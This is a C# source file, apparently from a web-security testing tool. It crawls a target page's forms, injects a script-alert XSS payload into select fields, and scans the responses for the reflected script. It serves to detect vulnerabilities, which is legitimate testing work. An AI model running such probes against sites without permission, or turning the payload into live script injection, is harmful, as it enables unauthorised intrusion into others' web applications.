using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text.RegularExpressions;
using Hacking_Rest_SqlInjetor.Form;
using Hacking_Rest_SqlInjetor.WebClient;
using Hacking_REST_Services.Helpers;

namespace Hacking_Rest_SqlInjetor.ServiceHandlers.AttackHandlers
{
    class XSS_Attack_Selects : AbstractServiceHandler
    {
        public override void StartAttack(string targetUri, ICustomHttpClient client)
        {
            Console.WriteLine($"cookiecount: {client.ClientHandler.CookieContainer.Count}");
            var openSite = client.Get(targetUri);
            var document = CustomHttpClient.GetHtmlDocument(openSite);
            var formsOfHtmlDocument = GetFormsOfHtmlDocument(document, targetUri);

            foreach (var form in formsOfHtmlDocument)
            {
                if (form.Method != "GET" && form.Method != "POST")
                {
                    continue;
                }

                var requests = InjectScriptIntoEveryField(form, targetUri);
                foreach (var request in requests)
                {
                    request.BuildRequest();
                    //Console.WriteLine(request.Content.ReadAsStringAsync().Result);
                    var performGetInjection = request.Method == HttpMethod.Get ? client.Get(request) : client.Post(request);
                    
                    string injectionResponse = CustomHttpClient.GetResponseContent(performGetInjection);
                    const string scriptRegex = @"<script>alert\('X(.*?)SS'\)</script>";
                    const RegexOptions options = RegexOptions.IgnoreCase | RegexOptions.Singleline;
                    var match = Regex.Match(injectionResponse, scriptRegex, options);

                    if (match.Success)
                    {
                        foreach(var item in match.Groups)
                        {
                            Console.WriteLine($"Possible XSS-Attack Vector found in InputField on {targetUri}: {item}");
                        }                     
                    }
                }
            }
        }

        private static IEnumerable<HttpContext> InjectScriptIntoEveryField(IFormData form, string targetUri)
        {
            var returnList = new List<HttpContext>();
            foreach (var input in form.InputFields)
            {
                var context = new HttpContext(form.Method == "GET" ? HttpMethod.Get : HttpMethod.Post, targetUri);
                foreach (var inputField in form.InputFields)
                {
                    context.AddField(inputField.Name, inputField.Value ?? "test");
                }
                foreach (var item in form.SelectFields)
                {
                    context.AddField(item.Name, $"<script>alert('X{input.Name}SS')</script>");
                }
                returnList.Add(context);
            }
            return returnList;
        }
    }
}
